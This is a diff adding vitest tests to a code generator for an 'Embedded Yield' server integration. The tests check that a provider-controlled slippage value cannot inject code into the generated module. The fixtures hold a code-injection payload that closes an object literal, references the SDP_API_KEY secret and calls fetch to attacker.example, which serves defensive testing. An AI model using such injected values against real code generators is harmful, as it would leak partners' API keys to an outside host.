@@ -350,6 +350,56 @@ describe("generated Embedded Yield integration", () => {
     expect(fetchMock).toHaveBeenCalledTimes(100);
   });
 
+  it("emits only a safe integer literal for the catalogue's slippage default", async () => {
+    // A catalogue row is provider-controlled JSON; the strategies read does not
+    // re-validate it, so a hostile defaultToleranceBps must never reach the
+    // module a partner copies onto their server beside SDP_API_KEY.
+    const hostile = "10 }, process.env.SDP_API_KEY); fetch(`https://attacker.example`); const x = {";
+    const source = buildEarnServerIntegration(
+      {
+        ...strategy,
+        depositSlippage: { quoteRequired: true, defaultToleranceBps: hostile as unknown as number },
+        withdrawalSlippage: {
+          quoteRequired: true,
+          defaultToleranceBps: 5_000 as unknown as number,
+        },
+      },
+      "https://api.test"
+    );
+    expect(source).not.toContain("attacker.example");
+    expect(source).not.toContain("const x = {");
+    // Hostile and out-of-range values both collapse to the documented default
+    // — once per build direction, always as a plain parameter default.
+    expect(source.match(/slippageBps = 10,/g)?.length).toBe(2);
+
+    const tuned = buildEarnServerIntegration(
+      { ...strategy, depositSlippage: { quoteRequired: true, defaultToleranceBps: 50 } },
+      "https://api.test"
+    );
+    expect(tuned).toContain("slippageBps = 50,");
+  });
+
+  it("still loads and runs the module generated from a hostile catalogue tolerance", async () => {
+    process.env.SDP_API_KEY = "sk_test_example";
+    vi.stubGlobal(
+      "fetch",
+      vi.fn(async () =>
+        Response.json({ data: { assetsOut: "1", assetDecimals: 6, blockingIssues: [] } })
+      )
+    );
+    const hostile = "10 }, process.env.SDP_API_KEY); (() => {";
+    const generated = await loadGeneratedIntegration({
+      ...strategy,
+      depositSlippage: { quoteRequired: true, defaultToleranceBps: hostile as unknown as number },
+      withdrawalSlippage: { quoteRequired: true, defaultToleranceBps: hostile as unknown as number },
+    });
+    await expect(generated.previewEarnWithdrawal("position", "1")).resolves.toEqual({
+      assetsOut: "1",
+      assetDecimals: 6,
+      blockingIssues: [],
+    });
+  });
+
   it("generates explicit queued request and post-deadline recovery calls", async () => {
     process.env.SDP_API_KEY = "sk_test_example";
     const requests: Array<{ path: string; body: Record<string, unknown> }> = [];
